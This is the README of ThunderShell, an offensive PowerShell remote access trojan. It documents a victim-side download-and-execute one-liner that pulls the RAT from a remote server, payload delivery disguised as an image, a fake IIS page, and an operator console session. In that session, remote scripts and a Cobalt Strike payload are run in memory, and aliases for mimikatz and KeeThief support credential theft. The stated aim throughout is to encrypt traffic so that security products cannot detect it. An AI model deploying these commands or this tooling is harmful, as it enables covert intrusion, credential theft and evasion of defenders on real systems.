# ThunderShell

ThunderShell is a Powershell based RAT that rely on HTTP request to communicate. All the network traffic is encrypted using a second layer of RC4 to avoid SSL interception and defeat network hooks.

# Dependencies

```
apt install redis-server
apt install python-redis
apt install python-tabulate
```

# Logs
Every errors, http requests and commands are logged in the logs folder.

# How it works

Once the PowerShell script is executed and HTTP request will be issued to the server. The body of each POST request contains the RC4 encrypted communication. Why RC4 because it's strong enough to hide the traffic. The idea is to upload / download data over the network that cannot be inspected. The RAT support HTTPS but some security product may perform SSL interception and obtain visibility on your data leading to detection of malicious payload (PowerShell script, stager etc...). The RC4 encryption allows you to communicate over the wire without leaking your payload. The RC4 encryption also protects against endpoint agent that inspects traffic directly on the host, again the traffic is decrypted at the "software" level blocking detection at that level too.

To use the power of the tool there is some built-in function such as `fetch`, `exec` and `upload` that allow you to run your payload quite easily.

* Fetch flow

```
The server will fetch a resource (path, url) 
        Send the data over the RC4 encrypted channel
                The PowerShell RAT will decrypt the payload 
                        PowerShell Execute the final payload
```

For example if you fetch PowerView.ps1 script it will be fully encrypted over the wire avoiding detection since the server is proxying the request and fully encrypt the data.

# Usage

## Victim
`powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://ringzer0team.com/PS-RemoteShell.ps1'); PS-RemoteShell -ip 1.1.1.1 -port 8080 -Key test -Delay 2000`
 - Make sure that the  `encryption-key` value in your JSON config file match the PowerShell PS-RemoteShell `-Key` option.
 - If you are using https on the ThunderShell server, add the `-Protocol https` attribute to the PowerShell  PS-RemoteShell launcher. 


## Attacker
### Configuration

default.json:
```
{
        "redis-host": "localhost",
        "redis-port": 6379,

        "http-host": "1.1.1.1",
        "http-port": 8080,
        "http-server": "Microsoft-IIS/7.5",
        "http-download-path": "cat.png",
        "http-default-404": "default.html",

        "https-enabled": "off",
        "https-cert-path": "cert.pem",

        "encryption-key": "test",
        "max-output-timeout": 5
}
```

### HTTPS configuration
If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this structure:

```
-----BEGIN RSA PRIVATE KEY-----
... (private key in base64 encoding) ...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
... (certificate in base64 PEM encoding) ...
-----END CERTIFICATE-----
```
### Payload delivery

The `http-download-path` is used to deliver the PowerShell RAT code. It will perform variables renaming by default and will deliver the payload only if the path match the one defined by the `http-download-path` variable.

In this example if the attacker browse to `http://1.1.1.1:8080/cat.png` the web server will return this:

```
function Get-UserInfo { PROCESS { if( -not (Test-Path env:userdomain)) { $EOhvOhtjB = $env:computername } else { $E
...
$gKnYkZ = Random-String -Length $mFkqJYoMKGl $MRdSPFQGDCQ = "hello $($gKnYkZ)" } $MRdSPFQGDCQ = $MRdSPFQGDCQ + "`n" $error.Clear() $ZKajjxCHtc = $MRdSPFQGDCQ + $YzFnzFOxZojQSmZ } } }
```

On your target you can execute the PowerShell script using the following command `IEX (New-Object Net.WebClient).DownloadString("http://1.1.1.1:8080/cat.png"); PS-RemoteShell -ip 1.1.1.1 -port 8080 -key test`

### Splash page configuration

You can customize the "error" page that is returned for every GET requests by specifying your HTML template through the `http-default-404` variable. The file need to be placed in the `html` folder and depencies such as images in the `download` folder. By default ThunderShell is mimicking an IIS server and return the default IIS server page.

### Delivering files

Everything that is placed in the `download` folder can be downloaded from the web server:

```
/pathto/ThunderShell/download/payload.sct

http://1.1.1.1:8080/payload.sct
```

### Launching the server
```
me@debian-dev:~$ python ThunderShell.py default.json

Thunder Shell 1.1 | Clients Server CLI
Mr.Un1k0d3r RingZer0 Team 2017
--------------------------------------------------------

[+] Starting web server on 192.168.17.129 port 8080

(Main)>>>
[+] Registering new shell 10.0.0.153:RingZer0\MrUn1k0d3r
[+] New shell ID 13 GUID is 4c05a17f-036a-4cd4-9446-da46281d5754


[-]  is not a valid command

(Main)>>> help

Help Menu
-----------------------

        list      args (full)             List all active shells
        interact  args (id)               Interact with a session
        show      args (error/http/event, count)  Show error, http or event log (default number of rows 10)
        kill      args (id)               Kill shell (clear db only)
        exit                              Exit the application
        help                              Show this help menu

(Main)>>> list

List of active shells
-----------------------

  4       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r
  3       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r
  2       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r
  1       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r

(Main)>>> list full

List of active shells
-----------------------

  4       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r 2836ccdc-6747-45a4-8461-fa4022ac6bd0 last seen 13/09/2017 09:59:32
  3       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r d09093a0-d3d7-4de9-b3a9-191ab7b2fef1 last seen 13/09/2017 09:54:31
  2       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r 8d95e7c8-6868-4eb3-8ba8-231a1fdfcb92 last seen 13/09/2017 09:50:18
  1       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r 90c608da-b64d-4d3a-9336-458e73658e49 last seen 12/09/2017 18:27:47

(Main)>>> interact 4

(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> help

Shell Help Menu
-----------------------

        background                              Return to the main console
        fetch         args (path/url, command)  In memory execution of a script and execute a commmand
        exec          args (path/url)           In memory execution of code (shellcode)
        read          args (remote path)        Read a file on the remote host
        upload        args (path/url, path)     Upload a file on the remote system
        ps                                      List processes
        powerless     args (powershell)         Execute Powershell command without invoking Powershell
        inject        args (32/64, pid, command)Inject command into a target process (max length 4096)
        alias         args (key, value)         Create an alias to avoid typing the same thing over and over
        delay         args (milliseconds)       Update the callback delay
        help                                    Show this help menu


List of built in alias
-----------------------

        powerup                 PowerUp tool set
        wmiexec                 Remote-WmiExecute utility
        searchevent             Search-EventForUser utility
        keethief                KeeThief tool set (Get-KeePassDatabaseKey)
        mimikatz                Invoke-Mimikatz utility
        inveigh                 Invoke-Inveigh utility
        powerview               PowerView tool set


List user defined alias
-----------------------


(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> whoami
RingZer0\MrUn1k0d3r

(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> delay 0
Updating delay to 0
Delay is now 0


(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> fetch powerview Get-NetLocalGroup -ComputerName 127.0.0.1
[+] Fetching https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
[+] Executing Get-NetLocalGroup -ComputerName 127.0.0.1


(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> refresh


ComputerName : 127.0.0.1
AccountName  : 10-R90G3RLC-1GG/Administrator
IsDomain     : False
IsGroup      : False
SID          : S-1-5-21-
Description  : Built-in account for administering the computer/domain
PwdLastSet   : 8/11/2017 6:01:45 PM
PwdExpired   : False
UserFlags    : 66049
Disabled     : False
LastLogin    : 8/11/2017 5:58:47 PM

(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> fetch https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1 Get-BrowserHomepage
[+] Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1
[+] Executing Get-BrowserHomepage

Start Page
----------
https://www.ringzer0team.com/


(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> ps

 PID Name                       Owner                    CommandLine
 --- ----                       -----                    -----------
   0 System Idle Process
   4 System
 364 smss.exe
 492 csrss.exe

(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> exec /home/attacker/cobaltstrike-reverse-https
[+] Fetching /home/attacker/cobaltstrike-reverse-https
[+] Payload should be executed shortly on the target

(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> background

(Main)>>> show http

Last 10 lines of log
-----------------------

192.168.17.1 (Wed Sep 13 17:09:42 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1

192.168.17.1 (Wed Sep 13 17:09:40 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1

192.168.17.1 (Wed Sep 13 17:09:38 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1

192.168.17.1 (Wed Sep 13 17:09:35 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1

```

# Todo

* Implement in memory protection to avoid endpoint in memory detection
* Generate random PowerShell to avoid RAT detection
* Implement different delivery methods
* Inject the PowerShell RAT into another process

# Credit 
Mr.Un1k0d3r RingZer0 Team 2017
